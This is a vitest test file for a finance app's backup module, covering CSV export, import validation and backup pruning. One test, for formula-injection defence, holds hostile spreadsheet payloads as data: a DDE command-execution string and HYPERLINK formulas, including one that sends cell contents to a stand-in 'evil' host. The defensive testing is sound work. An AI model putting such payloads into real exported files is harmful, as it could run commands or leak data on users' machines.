import { describe, it, expect, beforeEach } from 'vitest';
import { createTestDb } from './helpers/test-db';
import { runMigrations } from '$lib/db/migrations/runner';
import { migrations } from '$lib/db/migrations/index';
import { exportCsv, validateImport, getBackupsToDelete } from '$lib/backup';
import * as accounts from '$lib/db/repos/accounts';
import type { DatabaseService } from '$lib/db/service';

let db: DatabaseService;

beforeEach(async () => {
	db = createTestDb();
	await runMigrations(db, migrations);
});

describe('exportCsv', () => {
	it('exports tables as CSV', async () => {
		await accounts.createAccount(db, { name: 'Test', type: 'checking', currency: 'VND' });
		const csvMap = await exportCsv(db);
		expect(csvMap.has('accounts')).toBe(true);
		const csv = csvMap.get('accounts')!;
		expect(csv).toContain('id,');
		expect(csv).toContain('Test');
	});

	it('handles empty tables', async () => {
		const csvMap = await exportCsv(db);
		expect(csvMap.get('transactions')).toBe('');
	});

	it('neutralizes CSV formula injection in user content', async () => {
		// A payee/description beginning with = + - @ or TAB is executed as a
		// formula when the CSV is opened in Excel/LibreOffice — a real
		// exfiltration vector (=HYPERLINK("http://evil/?x="&A1)). csvEscape must
		// prefix such values with a single quote so spreadsheets treat them as
		// text. Today it only escapes , " \n and passes formulas through verbatim.
		const id = await accounts.createAccount(db, { name: '=CMD|"/c calc"!A1', type: 'checking', currency: 'VND' });
		await db.execute(
			`INSERT INTO transactions (id, kind, date, amount, account_id, tag_id, payee, created_at, updated_at)
			 VALUES (?, 'expense', ?, 1000, ?, 'tag_loss', '+1+HYPERLINK("http://evil")', ?, ?)`,
			['tx1', '2026-01-01', id, '2026-01-01', '2026-01-01']
		);
		const csvMap = await exportCsv(db);
		const accountsCsv = csvMap.get('accounts')!;
		// The leading = must be neutralized to a text literal.
		expect(accountsCsv).toContain("'=CMD|");
		expect(accountsCsv).not.toMatch(/[^']=[A-Z]/); // no un-neutralized =formula
		const txnsCsv = csvMap.get('transactions')!;
		expect(txnsCsv).toContain("'+1+HYPERLINK");
	});
});

describe('validateImport', () => {
	it('validates a correct database', async () => {
		const result = await validateImport(db, 3);
		expect(result.valid).toBe(true);
	});

	it('rejects wrong schema version', async () => {
		const result = await validateImport(db, 99);
		expect(result.valid).toBe(false);
		expect(result.error).toContain('Schema version mismatch');
	});
});

describe('getBackupsToDelete', () => {
	it('returns empty when under limit', () => {
		const backups = Array.from({ length: 5 }, (_, i) => ({
			path: `/backup/${i}.sqlite`, timestamp: `2026-05-${String(i + 1).padStart(2, '0')}`, size: 1000
		}));
		expect(getBackupsToDelete(backups)).toHaveLength(0);
	});

	it('returns oldest when over limit', () => {
		const backups = Array.from({ length: 12 }, (_, i) => ({
			path: `/backup/${i}.sqlite`, timestamp: `2026-05-${String(i + 1).padStart(2, '0')}`, size: 1000
		}));
		const toDelete = getBackupsToDelete(backups, 10);
		expect(toDelete).toHaveLength(2);
	});
});
